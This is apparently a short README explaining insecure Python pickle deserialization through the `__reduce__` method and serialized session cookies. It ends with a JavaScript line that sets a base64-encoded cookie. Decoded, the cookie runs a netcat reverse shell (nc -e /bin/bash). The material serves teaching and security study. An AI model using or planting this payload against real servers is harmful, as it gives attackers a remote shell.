# Server-Sided-Deserialization
See the problem with deserialization is that, if the users input contains malicious data in a serialized format the server will deserialize it hence the code execution<br>
<br>
If you look at my python example you will see the PoC for it.<br><br>
I'm not the best at deserialization so if i miss any information don't judge me lol
<br><br><br>

the `__reduce__` function works like this:<br><br>

```
class Exploit:
  def __reduce__(self):
    return(function, arguments)
```

<br><br>
The PoC i provided is used for webapps and they work like this:<br>
Cookies store session data which are serialized, this is the attack vector. When the cookie goes to the server it deserializes it for use.<br><br>
For example:<br>
`document.cookie='session=gASVOQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjB5uYyAxMjcuMC4wLjEgMTMzNyAtZSAvYmluL2Jhc2iUhZRSlC4'`
